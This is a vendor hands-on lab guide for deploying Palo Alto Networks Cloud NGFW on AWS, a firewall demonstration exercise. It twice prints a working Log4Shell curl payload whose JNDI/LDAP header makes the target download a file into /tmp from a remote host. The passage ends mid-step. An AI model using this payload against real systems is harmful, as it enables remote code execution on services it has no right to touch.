# AWS CloudNGFW Lab Guide

## Overview

The goal of this workshop is to take you through the experience of deploying the Palo Alto Networks CloudNGFW service on AWS to protect your Cloud Native Applications. This workshop will take you through the three step process of using the service - Subscribe, Deploy and Secure.

As part of the workshop you will learn to deploy the service on a centralized model and experience first hand how the service can protect your applications from attacks like the recent Log4J attack, out of the box.

## About Palo Alto Networks Cloud NGFW for AWS

Efficacy paired with ease of use is now here. Cloud NGFW for AWS combines best-in-class network security with cloud ease of use. Delivered as a fully managed cloud native service by Palo Alto Networks and procured in AWS Marketplace, Cloud NGFW for AWS extends cutting-edge threat prevention capabilities to AWS clouds. 

Cloud NGFW for AWS delivers these capabilities with deep, inline learning to help stop zero-day web attacks in real time, and block threats aimed at AWS Virtual Private Clouds (VPCs) where organizations place their workloads. Now, network security teams can easily obtain and deploy best-in-class protection across all of their deployments and secure their apps as they connect to legitimate webbased services. 

As the first NGFW to integrate with AWS Firewall Manager, the cloud-delivered service lets AWS customers take advantage of automatic scaling and high availability with no maintenance requirements. Cloud NGFW for AWS can be procured in AWS Marketplace, then quickly set up and integrated with native AWS services, enabling network security in minutes with just a few clicks.

## Audience

This hands-on lab is intended for anyone who has an AWS account and would like to get some hands-on experience with Palo Alto Networks Cloud NGFW for AWS. More specifically, this lab will benefit the AWS Cloud Network and Security admins of the world.

## Pre-requisites

1. First and foremost, we need an AWS account to run the lab.
2. Ensure that you have permissions for the below AWS services.
    * AWS Marketplace Subscriptions
    * AWS CloudFormation
    * Create or Update AWS VPCs, Subnets, Routes
    * Create or Update Transit Gateways and associated services.
    * Create or Update EC2 instances.
3. Ensure that you have a SSH Key-Pair already created that can be used to connect to the EC2 instances created as part of the lab setup.
4. Ensure that your network allows you to SSH to public EC2 instances. Sometimes SSH might be blocked by your organisation.

## Lab Setup

Please follow the instructions below:

1. Checkout or Download this GitHub repository.
```
git clone https://github.com/vsrkrishnan/lab-panw-aws-cfts.git
```

2. Identify the CFT for AWS CloudNGFW. You will need to upload this CFT file while launching the CFT Stack.
```
cd lab-panw-aws-cfts/aws-cloudngfw
ls aws-cloudngfw-lab-cft.yaml
```

__Note:__ If you do not have access to git, you can access the file directly on the GitHub link posted above and download the YAML file on your system.

### Deploy the AWS resources using CloudFormation

3. Now, log in to your AWS Management Console.
4. Navigate to the CloudFormation service. Make sure that you are in the _us-east-1_ zone.
5. Click on "Create stack" to begin creating a new stack.
6. Select "Upload a template file" and choose the CloudFormation template file that you have downloaded from Github in Step 1.
7. Click "Next" to proceed to the stack configuration page.
8. On the stack configuration page, provide a stack name of your choice.
9. Select the appropriate __Key-Pair__ that will be used to login to the EC2 instances. Leave the "LatestAMIId" field alone.
10. Click __Next__ to proceed.
11. On the "_Configure Stack Options_" page, review the stack configuration details. Click on __Next__.
12. On the "_Review Test_" page, review all the options. Click on __Submit__.
13. Wait for the CloudFormation stack creation process to complete. This may take a few minutes.
14. Once the stack creation is successful, navigate to the __Outputs__ tab to view the IP Addresses of the newly created EC2 instances.

### Setup the Vulnerable App Server

15. Open the EC2 console on AWS, navigate to the Instances page and check the checkbox next to _vul-svr_. Click on __Connect__ from the options on top of the page. 
16. Make sure that the _User name_ is __ec2-user__. Click on __Connect__. This will open an ssh connection to the _vul-svr_.
17. On the _vul-svr_ command prompt, execute the command below. You should see the response output as shown in the figure below.
```
sudo docker container list -a
```
18. If you do not see “vul-app-1” container up or the command errors out, look at the troubleshooting session for instructions for manual start.
19. If all is good, run the below command to update the “/etc/hosts” file to add an entry for the attack server.
```
sudo docker exec vul-app-1 /bin/sh -c 'echo "10.1.0.10 att-svr" >> /etc/hosts'
```
20. To verify the update of the hosts file, try to ping the att-app-server using the hostname provided. Press Ctrl+C to abort the ping.
```
sudo docker exec vul-app-1 /bin/sh -c 'ping att-svr'
```
On the output of the above command, you should be able to see some response from the att-svr. If you see any errors that say "Host unreachble" or something similar, please check the routing from _vul-svr_ to _att-svr_.

### Launch the Log4J Attack

21. On the Instances page, check the checkbox next to _att-svr_. Click on __Connect__ from the options on top of the page. 
22. Make sure that the _User name_ is __ec2-user__. Click on __Connect__. This will open an ssh connection to the _att-svr_.
23. On the _att-svr_ command prompt, execute the command below to launch the Log4J attack.
```
curl 10.0.0.10:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
```
24. You will get a “Hello, world!” message as a response indicating that the attack is successful.
25. Switch context to the **vul-app-server** SSH session and use the following commands to connect to the **vul-app-1** container and view the ```/tmp``` directory. You will see that the vul-app server has been infected with malware.
```
sudo docker exec -it vul-app-1 /bin/sh
```
```
ls -alrt /tmp
```

![](https://lh5.googleusercontent.com/wDXixyTsMKEro1mx9hXN4snqToRVgFDSRDY5Vqj8r1LJvgKb4oxJqUEwhv1yfCqQRp7I2918YGw4wgYlMKVU3VKcYNsqivFmw6n_GOO6kw36n0G6f0jroR9vfO1aUVzdmChvKev_lbyuHodgi8oInzQ)

26. Let’s delete the malware-sample file for now, for our attack attempt post the configurations of CloudNGFW.
```
rm -f /tmp/malware-sample
```

### Subscribe to AWS CloudNGFW service

We will now subscribe to Palo Alto Networks CloudNGFW service. Please follow the instructions listed below.

27. Search for _marketplace_ on the search window and click on __AWS Marketplace Subscriptions__.

![](https://lh4.googleusercontent.com/TvKinl1Oc5NLMTiGebxMlvNRSIxVBKG0ESZ7YzZ0DIquP5x93GvLPIEa_yKIxR5q_TOgXS4LlwgQTFjHnrC7zMXJwUFWosrwzC5vJpg-uPWgd8DQgKYfMF3NlR-b4q0NU1Hp1h34mjkVZuvUtzyKr9w)

28. By default, you will land on the **Manage Subscriptions** page. Now, click on **Discover Products** on the left hand menu.

![](https://lh3.googleusercontent.com/PgnR66jooEX04NanfDh1VYuoTl3ROfgcdxR7RlPzt4dgyyaw2m5PoroNoFLuHvmmeSj8zP138GMTJeRaJbFO7xFZFkCpASG7R712rHRkWcPEQF0nUlMFG6K0KBoyeLymLjWP1aQpW6MLovWENDKDvDQ)

29. Search for __"cloud ngfw"__ and from the search results that appear, click on the __Cloud Next-Generation Firewall (PAYG with 15-Day Free Trial)__ link.
30. Click on the __"View Purchase Options"__ button to start your subscription of Palo Alto CloudNGFW Service.
31. You can review the pricing details and click on __"Subscribe"__ and then, on the popup that shows, click on __"Set up your account"__.
32. This will open up a new page on the AWS Console where you can register for using the AWS CloudNGW service and also set up your account for usage.

![](https://lh5.googleusercontent.com/f1q8n8Vd2qQpIsobZs556AVkUCfcxOB9LeDnfNcL4aiADpS4AcAGiboT49KVs2nQKs-18FqPNgdGtqAArSETOosRBOg2htSL8wbhddRAH7V3yvfPYB9ouVqnyGkbSfrezUL7YDBm9uq8IMGcrlPR4_A)

### Create a Tenant

33. Click on the __"Login or create vendor account"__ to create a Tenant.

![](https://lh6.googleusercontent.com/6FQVmdl6pN_KHI5B7n7DzEQYlqRjHSAKAEgDsdG17cvoRF0hwUgJZw2K3Te0xMLf6WM96SYgc7jRw0179-Ah6VVa1kke8qw0cBCaRVrphRu6fl9e6PqwxYz1Cc8mSqESfxDYfYLCMS7TgMYAys2JRaY)

34. Provide an email address, first and last name.

![](https://lh3.googleusercontent.com/lmIJ6cLp7OF5vXjOYPGzSwODaSGvNxQm0a5poSk7rKsNT-FEWwFd1T4dtILzWEG7NZYd2X_CxOzpr9jVqy8bsW1P--x_TUqOvbl14hlrnCmcd6zwXY5U089CWTG5b5tJyk1OyUCqtq0J7FYI-zmPsTc)

**Note:** Make sure that you use your professional email address. The service will not work with personal email domains like gmail.com, etc.

35. Once you click on Create, an email will be sent to your email address with temporary credentials. Sign in to you email account and check for email from [noreply-cloudngfw-aws@paloaltonetworks.com](mailto:noreply-cloudngfw-aws@paloaltonetworks.com)
- Copy the temporary password provided in the email.

![](https://lh3.googleusercontent.com/-TiEenVd7a6990zv7LMYuS9uIcfW2zjHdkBrJjLXRsMM-58ztzLynja8pFVcHa9V7ZDn_wdcAlpNdfnRvyLtqbP0qDu3-M5QutY_gF4notWGoBxA6UZkP-Nm2JKGlPA4AQs69bK749rxKZcbs-uBSCk)

**Figure:** Email received on registering with the AWS Cloud NGFW service

36. Go back to the AWS Console. You will be prompted to change your password. After you have set a new password click on ‘Create’. 

![](https://lh3.googleusercontent.com/jojuUYO8Mg-TCOLEBdhoG0E-_-mi1ZkfDztKjiKty75nfbAUCgGj18aNdAc6M6juRoGcFfBts7btt0YpjQ1BraWlzk6vBoc8tNnIC1txdVLQarORmsx3TyuyrPcKDo1-CF_fDadX8GPTjru8XkH-UtE)

37.  Link new account status will be changed to “We linked your vendor account”. 

![](https://lh5.googleusercontent.com/rOTNqX3DmXnLtDCwpWqasAMPlDTDPaZDDTLIwE5Qc3kJu_rMjVri5wYvUH9Q4XnM5QysdtizX8s2aQyUDRqX4qEoOct7kzGiFhc5goXYeXSOKri52ADeZclHmEehgZwyqyK7xdIABrvH22otpOe0Rtw)

38.  Next click on __"Launch Template"__  to configure the integration between your vendor and AWS. This will launch the AWS CFT console.

![](https://lh6.googleusercontent.com/u2c4dJRj6JRPkvnaHL3wfZRepZR9t5Cr-r-V5Udaoig99Mk8tSfunwa9_r1pW7j5gaZ705onS_4zkvdpqiaJj_pX1fAs8p5MbJXChBQmdDjC4cPTGOMh3lLua255o8lMK9MO59-LcPLJRYZol5WhuuM)

39. The “Stack name” field will be pre-populated with the value “PaloAltoNetworksCrossAccountRoleSetup”. This must be changed to something unique to avoid any conflicts. In the case of a conflict, you will see an error saying that the “Stack already exists”. 

![](https://lh5.googleusercontent.com/t1lZrQJ3XFb_v0Mm2WWLPBuBA4VfM7GWb-Si0rxSAIp4lGMvo9qx9KvECijB5DCGuVUXne00Y9Pm9jna1I60Ok9XyaMibCWAOy5ETpeKcTWOPWLxl99KX319n0Ih94lgIqrM7c_XvT5DFCJudLETqew)

![](https://lh6.googleusercontent.com/ldspitreDvzQhOV793Io9DCFFBvbD3nfX0662-QON_H_dA1izO26DpFBbfAtlKPQNVHpZLlQWjcIGRrQDFjleNCB9ZtVFh_fxqGGEbiDq7wnUa3QCq3vK30uWkVSkqrz0Jvr67Y_U8pCyoJvGzMir-o)

40. For all other fields on the form, we will keep all default values.  Scroll to the end of the Form. 

**Note** the Cloudwatch log folder name **‘PaloAltoCloudNGFW’**. We will be using this later.

41. Select the check box to acknowledge.
42. Click on ‘Create Stack’

![](https://lh5.googleusercontent.com/Faa5ZA2RgSI4uUJKEjPPQThaZMHzwiKxCDmz1LmWCcttSfaorxt-YWJetQDXBluA5nQ88V5aWbXRX_mwRakmF190K8pDDp1k29SiGyvEbOgmAVaonkBfQ2Z9UgTPeNfZTAQNdopT4tJ-culNrOnaoM0)

43. Monitor the CFT deployment to ensure that it is successful. You might need to refresh for the latest status.

![](https://lh6.googleusercontent.com/-1q-6SHnTguLgb7w1Oky_JthA4KuHaMJ1U9oTPmS0mnufr-q7DF69e_0aAZFPYGpw--DAIJ2qqBTbRrZ0uFYHBrBm5_3RtI89znrQn0MZwn4rgTI_lK-sr10FYORyUeaSUSgotWSP7NXHEWNss2m5u4)

44. Now you have successfully subscribed to CloudNGFW service, created a tenant and associated your AWS account.
45. Click on “Launch Product” to log in to the Cloud NGFW console.

![](https://lh4.googleusercontent.com/PeLVGPV8fHasTQlmaSIHRwUZEQv02duW2BTjBKTpXURhk3ouH_4ZHW65ndwf2-laGLXQcbNtxrp1TxRAOj6sZ61UVr8gW7XwP5uAv1WPZWjfVAz6qaiClN427jPHHWWIXVQMY4YTvNXWMlCksYdAJHo)

46. This time use your new password to login. For the support account, provide organization name and address. (Fill the mandatory fields)

![](https://lh6.googleusercontent.com/Hw4oCamOrUeWTosCCoxN4Evgd1kkoNZa6n2OcIJwr-E1EBliuRqIaUHEGBuGZd0YPMFrJ-lggFxV_qWPWomE-rsuM6fBLYeC7ga9alnmvIiUP297TCydjXEjUiR5hoeotkK1cPlxGm04hFyZXXKAj-c)

47. Click the ‘Close’ button to finish creating the tenant.

![](https://lh4.googleusercontent.com/pEZY27iLfSkBSaOrVXF2UboVD_9tGsUj7OM6_Cfj3P9puSYmU9Ig6KbCOsExuAF1vH0iUodO2DNvSGDYYnY4mTblbV1zcWZAJxb11o9ISz5mV-ocd4k8wwuyZWeXZipEGNlWmxVkey5t1XaWQYIzIH8)

## Secure the AWS resources against the Log4J attack

### Create Rule Stack

48. Navigate to the CloudNGFW console. If you are not already logged in, open the link below on the browser tab and enter the credentials that you used to register earlier. 

<https://web.aws.cloudngfw.paloaltonetworks.com/>

49. Check that account addition has been successful.

![](https://lh5.googleusercontent.com/O94-VkijkpzNiTl6jVl7HwaFghspy8k2DUKSNukzp2L_IDcrkK3Nx0sNA13JLqpTjPaXJ1Qv2W7F--1We322XOGyTrY2KBPl9DpoGXLT87HTH80r9Az1_N5OJVg6_O3qKF8pMqgnI9ef0Dib4KZ9SGs)

50. Navigate to ‘Rulestacks’

![](https://lh6.googleusercontent.com/w8cpdoKDqRsEaSzhcbn-vQV4YTCWYTgv10NZ46cqqYfREsQXWFjUYZ9z-SOBqiIoDuv6ipCpqbDXLT-VUh2XCmiv-lHo9mlHCawWnvErz3I0UJq6z-KQyioZRN18w2eRBEGAana6A-ORpytJwwS4k5E)

51. On the right top corner click on ‘Create Rulestack’ and ‘Local’

![](https://lh6.googleusercontent.com/h-7G2hcK1kamyoTTDn4tgZ8Adk8TCwSWT00L_rBFUbQ0vTJLwiLbDcP_PZZCFtNR4dsNUdC2sQ98IcmHGgUEKk_U7GWqFX1D3dLE954nSmccSRrUXYu23aY0P34PUs1i4qYivMKwLD1V5ldqxJEm1mI)

52. In the Create Local Rulestack form, 
- Name the rule stack ‘Rulestack1’ 
- Choose the AWS account from the dropdown.
- Click ‘Save’

###  Create a Firewall Rule

53. Navigate to Rulestack and click on ‘Rulestack1’

![](https://lh5.googleusercontent.com/VyhB6hAv8QO2H2bGa5jpDwY5LRyBo5A92qOSWCp0YGlnfTUaNaawJ8ty8fRA5uZh4AtH9tiul6S8HFASqjyj5I70RcsULOeqAXTtbaXEx1xXD3mI8d3jOHB6sZfPw3UggaC1B15aX4AImgG5yMr4naM)

54. On the Rulestack page, click on the ‘Rules’ tab and click ln ‘CREATE”

![](https://lh6.googleusercontent.com/-a3a9hbzZvlfuLGzuRZPA3tPLvU3QLbat6dLB_IxtSQEFPH7b5Pi8jbOUzfB8pS4dKX3cdWpADt8yH2EspkLa0Qc4TuzYNUl3urWSyYUJbO0TVM8MBYG8ozP4MmV6JtYbTc5oy76cmbp_NefR18aGis)

55. We will now create a rule that allows all traffic, but applies security best practices through _Security Profiles_. In the General section of the Create Rule Form,
- Name the rule ‘MyFirstCloudNGFWRule’
- Set the Rule Priority to 1
- In the Source and Destination section of the Create Rule Form, leave Source and Destination values as ‘any’

![](https://lh3.googleusercontent.com/H4mr3MQYwT4VZH6tXbuMwivBZzSJK6ZPJtbolwzLtvPrUL0WEksOnoHFToq2w4A140lM1bJ5YwFLHmbPfpn1UrZSoZFt6tYDPWmd-MCNQWl-UvotdX-VtIQgV0UUaHUC5BIdYqxcRQT7RxBuWL_I0H4)

- Scroll down to the Granular Controls section. Set the “Protocols and Ports” value to ‘Any’.
- In the Action section, set the value to “Allow” and click the checkbox to enable Logging.
- Click ‘Save’.

![](https://lh5.googleusercontent.com/nGcNSDS5ZUyw80kvrPoVLd139wJZpVifBitWvaEL6_k5vuljkEY02TKlFSxRi6CTDkXHKXuMBsxUpLotkJgSVlsioao732eGQOPMTQm93yvosVGp85D6rr67XUZOxGcKWPKhrxBqavrd9tj96Tt81sc)

56. Navigate to the top right and using the dropdown next to ‘CONFIG ACTIONS’, select ‘Deploy Configuration’

![](https://lh3.googleusercontent.com/ssuUl2ZKsSyQV9kNwbQb6cmKgtnN-OGKo4JmuLyJckNJN7QOeHsKS77bGCKI5X2BNhjQYSmld-UwwK-gw3uPCcxkrRgcWpsz7zlR97iyBpvq_aDxNSbdoh9OyD77_qS5uYXJ8BwEJ8ndY4YdyUfHn2g)

57. Status changes to committing. You will see a pop up momentarily that the commit was successful.

![](https://lh4.googleusercontent.com/q8s25kdtTa9XgZad3E27BNh5C4MNvmdXyC96SkqTUbWEK-jVtBLethV5Trb-WNwMcq_SRytY7T9UMQlTuC7X26zHrSij6d0mq9RNR-lfaHn4DRV52GszJKGSfAM4IlODnxIzAYXjYZs1gd-3q6O46cw)

58. The Rulestack and Firewall Rule creation is completed.

### Deploy CloudNGFW and create endpoint

We will now deploy the cloudNGFW service on the security VPC. The security VPC along with the Application and attack VPCs were provisioned using terraform.

59. Navigate to the AWS Console browser tab. Search for VPC and click on VPC.

![](https://lh5.googleusercontent.com/f6NaKV8jP8-tfmYt58waa1V2Fi_svl7_0grK2RcLc5uvC7CWKU1pPBzscENXFhz4LOAPHuOTA0ejgCJn-u-wobLyvDj9q2ikKjuhnMrQzfEc5_39MZW6X6I6eI8J1fo-DsvHL5ZriH5jKHzoBZ6JWgs)

60. Review the services that are already provisioned. Click on the ‘4’ against VPC to list the 4 VPC created.

Note that the name of the security VPC is “**sec-vpc**”. We will be deploying the CLoudNGFW endpoint here. 

![](https://lh6.googleusercontent.com/7tMlPgcQZuDsWBdM9gN3K0eePLq5p2yYiSjTvzDyn2oZ0QRLsXaUnmgwyDyGHIwHc05LZMbkZ_DtqgL_T1n1XM81ZKxPpPZ03o4TXxXYfuwRfy-zgOeCzFBPymRLfQxexTtyIlRCJiBIxRLH3l05WGY)

![](https://lh5.googleusercontent.com/2xBafpO_71yrBVEXamRxw_RlfgY_RMCSv5l5f_1GSvo4dx_SWNhcAFk4FhFhm0MlxhkZxiy0vvE21GHCI-O1ZIwc3ekkFVUe3DbrQGc3q4wnWZjlobGIKC0urj_xuuaz_ZsQzSbh-rRGcrK_NCgatpY)

61. Navigate back to the Cloud NGFW browser tab and from the left vertical menu select ‘NGFWs’

![](https://lh6.googleusercontent.com/e3xdnYSNGxU7cd45aU0jEbBE1T2GhviXHXCdlID2_qMTpx9-LLIuNOKuq6U8nUdYZNC2noyVxksiVkj4a3QLrhd3AS-qqvqQbZnP5D585JtP_wHKdiU3P6JHY63SDE0MCppExEvzQA4B_xzZ6N3wHBo)

62. On the top right, click on ‘Create Firewall’

![](https://lh6.googleusercontent.com/_shcZlc-v4mJ_Ne1TBDku-ll2Q41zwt4j6LsCl1Rze1vnyN7Nh_BHoApWB7HsEPFllSxHsMAWITxsgKkUwe3MUHWeuAwrfPzJ28P__k2w0D6jDL9aiWrYSy11wjIGAZZaP20swZITGG3blP_Z11tLPU)

63. In the General section of the Create Firewall form, 
- Name your CloudNGFW instance ‘MyfirstCloudNGFW’
- Select your AWS account
- Set VPC to ‘sec-vpc’

![](https://lh6.googleusercontent.com/uG9ZgL_QXrT5_DE3XcE6pM-7mYdODtzB5M2cwvMbpXPCjZ5Wif3x6XR8W6ftBT1P_E-TejLNiVn83prSHt10tIv_YQAyTuD3-ds64mh0GmeYnfVyHg8x0_AGBxAUnVAWNuU73gk2rBEaGnFeiG0eXbM)

64. In the Rulestack section of the Create Firewall form,
- Set Rulestack to ‘Rulestack1’ from dropdown
- Say yes to create endpoint
- Select sec-vpc-gwlbe-subnet
- Click ‘Save’

![](https://lh3.googleusercontent.com/3FNRuH-ns-vaczaub_Qd6f1x8X15U5tPy8_o_rPbuNTYr2o23iJyrrD6nCbCa3cEA6xJcKl5dnuYxdpHR8iqfFaqBHpKkY4u90HFzZelLK-2Ex8JHE2OSxpRnnai78WPCO6iEBIi115H4G2DWpCZEYU)

![](https://lh3.googleusercontent.com/SfwzOJqInWrZSIN2gc2U1n2F1yFwXXnL2lV-cl9hTzsNeKrSgpcpzy5FTffTHCErY5TYhUZ4IVvbZhFnWUF92ReMuqM3jQ7KCCV4EIUM8_R3uB3rrKRt8mkzLYmK9pP1UT4n71hyczOWuYUFF1WaasI)

65. You have initiated deployment of CloudNGFW in the AWS environment. The deployment will take around 10-15 mins to complete successfully.

### Configure Logging

66. Navigate to the AWS console browser tab. In the Search bar at the top, type “cloudwatch” and from the search results, click on ‘CloudWatch’.

![](https://lh6.googleusercontent.com/A6eaatDWB6kc2Ej8f0-y-tWOZL-cD-Ws0FSudRS8lA2nlhCSug0xTsGcvv_ZGNmgLrBPKynU4bZ58u1Zn9e5jlZ6p2hPHU1BUF0cO9eqh5nNgm2bBzDcWW7Ca3dR7wtDfx7y1MZSwi8Nx_gAoKgoJlw)

67. On the left menu, expand ‘Logs’ and click on ‘Log groups’. 
68. Navigate to right top corner and click on ‘Create log group’

![](https://lh3.googleusercontent.com/jM-mzkwDqyOiY1wHX7qhMlXvcQViYovTEuDmczkouSeEzJAFYu5MJEkLFJzmaWY6uHHWrSPeTUjThRSfjYAb32WlP0iwzbxQQZRuRLeYHk7GCfsRr1l47KZNszLlXis3Lite06CTAIUHjHLnrSPqjb4)

69. Set the log group name to **‘PaloAltoCloudNGFW’**. Note the name should match exactly in case. Click on ‘Create’.

![](https://lh6.googleusercontent.com/eQNt09fjAJoRNc6NPf7rsc3GRKSeMb7-e7sKq8fSCWgnzqx62VURXbyZu5rpXFjnnf5myYZeUDeo8eEp_LcPiouh5ScorocvqP361fdHYsPsK3ts_xmYxvt4GkTyef0Y8jGADz-ssME6cWsjuSYEgRk)

![](https://lh5.googleusercontent.com/6d0wpPqG_9I1T7uT3H9W1_NCsTIa16QA2rkDGcAk9bIoWF_w9b3E7Ifl0ltycFFW6EoqpVfGhhQpFmzwA_OAFYIcYNsnCJauxdz_hi1xXP2x2nEScifr45b35Y6pSBWdTrzIT_jXdhzD0xEBLmg9Lxs)

70. Navigate back to the CloudNGFW console.
71. Click on NGFWs and ‘myfirstCloudNGFW’

![](https://lh6.googleusercontent.com/PyfY5bolfUkyMAV18E_sFqwfyDN_oO_IlxX6vL7LYZ9m9foj5LNM6_sICCL56ZpgoJ4j8uk8CVtmp_UCPqkxg5dDOgzoVqH84Bmb-n3CVFQ31YlJAUO-W4NIp_6YMuyq1zWt-MVlrtMdoNuJIPxwpL8)

72. Navigate to the ‘Log Settings’ tab. In the Log Type section,
- Select checkboxes against TRAFFIC  and THREAT.
- Select the Log Destination Type as Cloudwatch Log Group and type in ‘PaloAltoCloudNGFW’ as Log Destination. Note that this is the CloudWatch Log Group that you just created.

![](https://lh4.googleusercontent.com/67LibvC4daSqzyJdvvXNKIQ2MS7YDPo4kPlZGlCVHy6nR2F32pIeu8D99FfgoR-vXkiXbVSOegkzTFA4_X8srRUvTZNC9A-6bfM5noVpSEppPSZUoBO9pn--2DVcd8ftB6xm46UEa7CbLNV43AAv7G8)

73. Navigate to the ‘Threat’ tab and do the same. Click save.

![](https://lh4.googleusercontent.com/n57JuoBPVCDCocMdI3qftzfAXf7qyd-mlpZVo1yDotcKXhfi-ZURJKcXAu2YSsnn1nrfY-eIIcFf6PDOasQi_De8ltDJFHZvSv0OE9y8UsKfNqPZsStu8YUxAZ6DiQk4j8vTw4iYq6tudeDMEMtolm8)

### Route Traffic to Firewall

74. Navigate to the AWS Console browser tab. 
75. In the Search bar at the top of the page, type “vpc” and click on VPC from the search results.
76. In the left menu on the VPC console, click on _Transit gateway route tables_.
77. From the list of Transit gateway route tables, identify the route table with the name “**from-app-vpcs**” and click on the _Transit gateway route table ID_ corresponding to it.

![](https://lh4.googleusercontent.com/8qmKOSisKTvPOk7IsFsaedVPxoNxt6VFhEF8UYrvLfRNqJGEBDCucwYk8UHbBsiQYcaFAVqKxPJRvZJ3aVL6WXIna8ACKgY3n8roAdp4okLOP66pBTn1KhnGoglddeaSAuWVp0L2nPM-TRv_zH3YPJ4)

78. Navigate to the _Routes_ tab, from the route table, select the static routes to the app servers and delete them one by one. Basically, we are deleting the direct static routes that allow East-West traffic between the app servers . This is because we want to route the East-West traffic between the app servers via the Cloud NGFW. 

![](https://lh5.googleusercontent.com/E9YucgxamVIKaN_HNSv25OeMAC3MukReTzen1Nch6B6_-QnJ22LvSmkyEp1Qvyk06wKKFT89TChXP02yUQtilLlMgkeSmGAFpOYIBz77CFmvt_MMybIhdlcsuWqZgkSRSapVm6xXcx3c0P5PbTnRB1k)

79. Once that’s done, again in the left menu on the VPC console, click on Route Tables. 

![](https://lh4.googleusercontent.com/qtl-niPTp7VtlIGCiFBIWNwGPQaO2ayjKA2zUoRfwORQ0P6dX6mgxHdsIPke8_Retvt_GvYtsiV9dnZkjHasFXBFdB5LhQKBrpHClkkKd2_PiidNtPbYTFle-5KCxaq47hQk-KlIXPdA1D2JDJYU-vU)

80. From the list of Route Tables, identify the route table with the name “**sec-vpc-tgw-rt**” and click on the Route Table ID corresponding to it.
81. In the _Routes_ section of the selected Route Table, click on _Edit Routes_.

![](https://lh5.googleusercontent.com/zM8COgFlSva4fyLEMPgdyAFRkhVB41Uc8-RhkNRSPYK1R8owszNZJFmw4JAL8_f_TLhvfRY6l5q8uUwKqiu7gmAjdaLE1G1aZL-cvFWtVzV85KHr8NofuugcyF8N9liiRs84lLIPwTCHyVdKL0ac0qY)

82. On the _Edit Routes_ page, 
- add a route with destination 0.0.0.0/0. 
- In the Target field, select the GWLB (Gateway Load Balancer) Endpoint created by CloudNGFW.
- Save changes

![](https://lh5.googleusercontent.com/S4BlXjQP5RYMIGuvIkX3__-X7vSN6nYPaapj5iV8g0KmG2YNcmSefP_i3Xgn_r9V1hbJv9TxLiLYVeAELmjL-JJzO2mNCs7LYDOeOdAIlFmrDTHGBy7sN6I-BRGRh9CTduNOLbWSBD1HfoWELjr6DUk)

### Launch the Log4J Attack

83. On the **att-app-server** command prompt, execute this command to launch the Log4J attack.

```
curl 10.0.0.10:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
```

84. This time, you will not see the ‘Hello, world” message as the attack will have been blocked by the NGFW.

![](https://lh6.googleusercontent.com/n9Z6WR3jJHVxh_5N8TRB-IB2jW0mRal8FwYVW6w09968Gw-sLEB90cKNEdn6YCZsU7YjkgaV4qtV3fJ3yi41qsxIvQvehgUrMWWKulN-oyOH4phjTxzYfFJoEW6I-pMzkVxzCJCsmWfzV1zZ470)

### Monitor threat log

85. Navigate to the AWS Console browser tab, on the Search bar at the top of the page, type “cloudwatch” and select “CloudWatch” from the search results.
86. From the left menu, click on “Log groups” and from the list of Log groups, select “PaloAltoCloudNGFW”.
87. Navigate to AWS CloudWatch browser tab and click on ‘Log Groups’
88. Click on the THREAT log file.

![](https://lh5.googleusercontent.com/6_x3TcTGkZv2VPIJBxeoDlDG980gohlde3O62gCeQwVsQ1gKf3D1psP9ERpFJTuThYbf0wRjKsJAp2kKzoP4RU7MZUL-Bh17YhSbaLy5yICANUnCFdNZV_BgheGiMOi-3YlQANcUcPtnsVQQz0poo68)

89. Click on the arrow to open the log. You can see that CloudNGFW successfully detected and prevented the attempted Log4J attack.

![](https://lh4.googleusercontent.com/QVyfTld7k4H5CjwDquHgjqsHjOW_bM-kEZSLgEEoF6oV1YbexVzilJpkWLVhuEIGMmaw_iD7Gg91SkV1h2Ap6ibzb6QOht0odJlAvfPC9c-1bWbvuzszM0WPUkXzgpiutjwQKOsnGEMqMCtUgLPiCFQ)

### Play around with Security Profiles

90. On the CloudNGFW Console, navigate to _Rulestacks_ and click on ‘Rulestack1’

![](https://lh5.googleusercontent.com/VyhB6hAv8QO2H2bGa5jpDwY5LRyBo5A92qOSWCp0YGlnfTUaNaawJ8ty8fRA5uZh4AtH9tiul6S8HFASqjyj5I70RcsULOeqAXTtbaXEx1xXD3mI8d3jOHB6sZfPw3UggaC1B15aX4AImgG5yMr4naM)

91. Navigate to the ‘Security Profiles’ tab.

![](https://lh4.googleusercontent.com/8ekWbvx50uSvtmAmq9qO6tRzw9xxosIDVPNvv0OttCYdsFNFafudjkC3Aos6DwTXxhHhpJwj2kPxJVUG7yqYzg1zfNqNOtdaKYSivHfydKt4INktcqodf8kkM40GrDAgaajaEFjDa9HYdHGpOqzUdCk)

By default, IPS Vulnerability, Anti-Spyware, Antivirus and File Blocking features are enabled in the Security Profiles. This is what blocks the Log4J attack in the previous step. Just for the purpose of this activity, we can disable some of these profiles.

92. Disable IPS Vulnerability, Anti-Spyware, Antivirus and File Blocking.

![](https://lh6.googleusercontent.com/sfPF-dY13L4PCGcGsRZKet7g0596YboPv0yh-SYWzrVqfYTKuorC8ZRRLH882h9qbwHOye4TboGsRVQh9g-egzNVMXr_ga3ZndZwxiYkOnkzVPw4JrwFCmEA3_IEECfbvnEoQz9VUnJ9JLtHm_fkmGU)

93. From the ‘CONFIG ACTIONS’ dropdown list at the top-right side of the page, select ‘_Deploy Configuration_’.

![](https://lh4.googleusercontent.com/UqMcelwDqPiw9Z78GTOjAZMq2jjM4gWP1Tn6ydbHsV54ckD4tNJyPPe8Mb-moWsfTbuT1IcI1xi5pSUAsS7HE7mFWNlaCOKCluCgNEppmzX5s9Egdpq8Ez8qtjIGKc2_mbxOHFjWvVZBh-4jq9vONJw)

94. Commit status will change to ‘Pending’ and then ‘Success’

![](https://lh4.googleusercontent.com/5YFVro3b1fjIyK3flyHQuXZh8kpejcm4mqJhIUGxxJh1P-V1polTJz_XXa2gQQWo7goiojx3xATq7jiXWDfAOL7ZY1GpY8B34Q65oXIWgxAXnQa-IqnEf_kiEwdOPYPo9sFbZwII8TC-g5_tHRqUCAs)

### Relaunch Attack

95. Navigate to att-app-server SSH session and launch the attack again.

```
